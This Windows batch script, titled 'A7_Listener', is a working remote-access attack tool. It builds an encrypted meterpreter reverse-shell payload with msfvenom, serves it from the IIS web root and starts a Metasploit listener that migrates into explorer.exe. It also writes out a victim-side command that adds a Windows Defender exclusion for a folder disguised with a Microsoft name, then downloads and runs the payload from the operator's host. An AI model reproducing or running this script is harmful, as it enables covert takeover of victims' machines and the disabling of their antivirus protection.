@echo off
title A7_Listener
if not "%1"=="am_admin" (powershell start -verb runas "%0" am_admin & exit /b)
ipconfig
set /p ip=Enter Your ip:
if not exist "%programdata%\A7_Controller_Temp\meterpreter" md "%programdata%\A7_Controller_Temp\meterpreter"

set rand_app_name=regid_%random%%random%
echo md "%%programdata%%\regid.1574-03.com.microsoft" ^& powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%%programdata%%\regid.1574-03.com.microsoft" ^& %%systemdrive%% ^& cd "%%programdata%%\regid.1574-03.com.microsoft" ^& powershell -command "Invoke-WebRequest -URI 'http://%ip%/service.exe' -OutFile '%%programdata%%\regid.1574-03.com.microsoft\%rand_app_name%.exe'" ^& %rand_app_name%.exe > "%systemdrive%\Program Files (x86)\Advanced Port Scanner\commands.txt"
if exist "%systemdrive%\inetpub\wwwroot\Service.exe" del /q "%systemdrive%\inetpub\wwwroot\Service.exe"
start /min /wait %systemroot%\system32\cmd.exe /C %systemdrive%\metasploit-framework\bin\msfvenom.bat -p windows/x64/meterpreter/reverse_tcp LHOST=%ip% LPORT=7899 EnableStageEncoding=true ReverseAllowProxy=true --platform windows -f exe -e cmd/powershell_base64 --encrypt aes256 -i 17 -a x64 -o "%systemdrive%\inetpub\wwwroot\Service.exe"
if not exist "%systemdrive%\inetpub\wwwroot\Service.exe" echo UNABLE TO CREATE PAYLOAD & pause & exit

echo use exploit/multi/handler> %programdata%\A7_Controller_Temp\listener_temp & echo set payload windows/x64/meterpreter/reverse_tcp>> %programdata%\A7_Controller_Temp\listener_temp & echo set LHOST 0.0.0.0>> %programdata%\A7_Controller_Temp\listener_temp & echo set LPORT 7899>> %programdata%\A7_Controller_Temp\listener_temp & echo set EnableStageEncoding true >> %programdata%\A7_Controller_Temp\listener_temp & echo set AutoRunScript "post/windows/manage/migrate -N explorer.exe" >> %programdata%\A7_Controller_Temp\listener_temp & echo set ReverseAllowProxy true >> %programdata%\A7_Controller_Temp\listener_temp & echo exploit>> %programdata%\A7_Controller_Temp\listener_temp
%systemdrive%
cd "%programdata%\A7_Controller_Temp\meterpreter"
cls
%systemdrive%\metasploit-framework\bin\msfconsole.bat -q -r %programdata%\A7_Controller_Temp\listener_temp
